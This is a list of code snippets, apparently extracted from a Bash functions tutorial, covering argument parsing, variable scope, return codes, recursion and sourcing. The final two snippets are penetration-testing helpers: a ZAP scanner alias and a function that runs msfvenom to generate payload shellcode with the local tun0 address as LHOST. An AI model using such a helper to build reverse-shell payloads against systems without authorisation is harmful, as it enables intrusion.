["```\n parse_args() {\n  while [[ $# -gt 0 ]]; do\n    case \"$1\" in\n      -h|--help)\n        usage\n        exit 0\n        ;;\n      -v|--verbose)\n        verbose=true\n        ;;\n      *)\n        echo \"Invalid argument: $1\"\n        usage\n        exit 1\n        ;;\n    esac\n    shift\n  done\n}\n```", "```\n function_name() {\n  # commands go here\n}\n```", "```\n function function_name {\n   # commands go here\n}\n```", "```\n greet() {\n  echo \"Hello, world!\" }\n```", "```\n greet() {\n  echo \"Hello, world!\" }\n```", "```\n greet\n```", "```\n Hello, world!\n```", "```\n greet() {\n  echo \"Hello, $1!\" }\ngreet \"John\"\n```", "```\n Hello, John!\n```", "```\n greet() {\n  echo \"Hello, $1 $2!\" }\ngreet \"John\" \"Doe\"\n```", "```\n Hello, John Doe!\n```", "```\n print_arguments() {\n  for arg in \"$@\"\n  do\n    echo \"Argument: $arg\"\n  done\n}\nprint_arguments \"tsmith\" \"sjones\" \"mknight\"\n```", "```\n Argument: tsmith\nArgument: sjones\nArgument: mknight\n```", "```\n if [ \"$#\" -ne 2 ]; then\n  echo \"Usage: $0 <arg1> <arg2>\"\n  exit 1\nfi\n```", "```\n greet() {\n  local name=${1:-\"Guest\"}\n  echo \"Hello, $name!\" }\ngreet\ngreet \"John\"\n```", "```\n Hello, Guest! Hello, John!\n```", "```\n #!/bin/bash\nname=\"John\"\ngreet() {\n  echo \"Hello, $name!\" }\ngreet\necho \"Name: $name\"\n```", "```\n Hello, John! Name: John\n```", "```\n #!/bin/bash\ngreet() {\n  local name=\"Alice\"\n  echo \"Hello, $name!\" }\ngreet\necho \"Name: $name\"\n```", "```\n Hello, Alice! Name:\n```", "```\n #!/bin/bash\nglobal_var=\"I'm global\"\nmy_function() {\n  local local_var=\"I'm local\"\n  echo \"Inside function:\"\n  echo \"Global variable: $global_var\"\n  echo \"Local variable: $local_var\"\n}\nmy_function\necho \"Outside function:\"\necho \"Global variable: $global_var\"\necho \"Local variable: $local_var\"\n```", "```\n Inside function:\nGlobal variable: I'm global\nLocal variable: I'm local\nOutside function:\nGlobal variable: I'm global\nLocal variable:\n```", "```\n #!/bin/bash\ncount=0\nincrement() {\n  count=$((count + 1))\n}\necho \"Before: count = $count\"\nincrement\necho \"After: count = $count\"\n```", "```\n Before: count = 0\nAfter: count = 1\n```", "```\n function check_file {\n    ls \"$1\"\n    return $? }\ncheck_file \"example.txt\"\necho \"The function returned with exit code $?\"\n```", "```\n function is_even {\n    local num=$1\n    if (( num % 2 == 0 )); then\n        return 0  # Success, number is even\n    else\n        return 1  # Failure, number is odd\n    fi\n}\nis_even 4\nresult=$? if [ $result -eq 0 ]; then\n    echo \"Number is even.\" else\n    echo \"Number is odd.\" fi\n```", "```\n square() {\n  local result=$(($1 * $1))\n  echo \"$result\"\n}\nsquared=$(square 5)\necho \"The square of 5 is $squared\"\n```", "```\n 25\nThe square of 5 is 25\n```", "```\n factorial() {\n  if [ \"$1\" -eq 0 ]; then\n    echo 1\n  else\n    local prev=$(factorial $(($1 - 1)))\n    echo $(($1 * prev))\n  fi\n}\nresult=$(factorial 5)\necho \"The factorial of 5 is $result\"\n```", "```\n The factorial of 5 is 120\n```", "```\n function greet() {\n  echo \"Hello, $1!\" }\n```", "```\n source script1.sh\ngreet \"John\"\n```", "```\n zapit='docker run -it --rm softwaresecurityproject/zap-stable zap.sh -cmd -addonupdate -addoninstall wappalyzer -addoninstall pscanrulesBeta -zapit'\n```", "```\n gen_shellcode() {\n  if [[ $# -eq 0 ]]; then\n    echo \"Usage: gen_shellcode [payload] [LPORT] [output format]\"\n    return 1\n  fi\n  msfvenom -p $1 LHOST=$(ip -o -4 a show tun0 | awk '{print $4}' | cut -d/ -f1) LPORT=$2 -f $3;\n }\n```"]